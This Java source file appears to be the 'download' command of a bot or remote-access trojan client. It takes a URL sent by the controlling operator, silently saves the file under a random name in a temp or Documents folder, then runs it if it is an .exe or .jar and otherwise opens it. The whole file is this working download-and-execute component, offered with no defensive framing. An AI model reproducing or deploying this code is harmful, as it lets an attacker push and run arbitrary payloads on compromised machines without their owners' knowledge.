package commands;
import java.awt.Desktop;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

import bot.Main;

import com.redpois0n.common.util.Util;
import oslib.AbstractOperatingSystem;

//import com.redpois0n.oslib.OperatingSystem;
import oslib.OperatingSystem;



public class CommandDownload extends Command implements Runnable {
	
	private String link;

	@Override
	public void perform() throws Exception {
		this.link = Main.readString();
		new Thread(this).start();
	}

	/**
	 * Starts a new thread downloading and executing the file
	 */
	public void run() {
		try {
			File file = null;
			String extension = link.substring(link.lastIndexOf("."), link.length());
			
			if (!extension.startsWith(".")) {
				extension = "." + extension;
			}
			AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
			if (os.getType() == OperatingSystem.WINDOWS) {
				file = File.createTempFile(Util.randomString((short) 8), extension);
			} else {
				file = new File(System.getProperty("user.home") + File.separator + "Documents" + File.separator + Util.randomString((short) 8) + "." + extension);
			}
			
			URL url = new URL(link);
			
			InputStream stream = url.openStream();
			
			FileOutputStream output = new FileOutputStream(file);
			
			byte[] buffer = new byte[1024];
			int read;
			
			while ((read = stream.read(buffer)) != -1) {
				output.write(buffer, 0, read);
			}
			
			stream.close();
			output.close();
			
			if (extension.equalsIgnoreCase(".exe") && os.getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("\"" + file.getAbsolutePath() + "\"");
			} else if (extension.equalsIgnoreCase(".jar")) {
				String javaPath = System.getProperty("java.home") + File.separator + "bin" + File.separator;
				String javaProcess ="javaw";
				String process = javaPath + javaProcess;
				
				Runtime.getRuntime().exec(os.getType() == OperatingSystem.WINDOWS ? "\"" + process + "\" -jar \"" + file.getAbsolutePath() + "\"" : "java -jar " + file.getAbsolutePath().replace(" ", "%20"));
			} else {
				Desktop.getDesktop().open(file);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
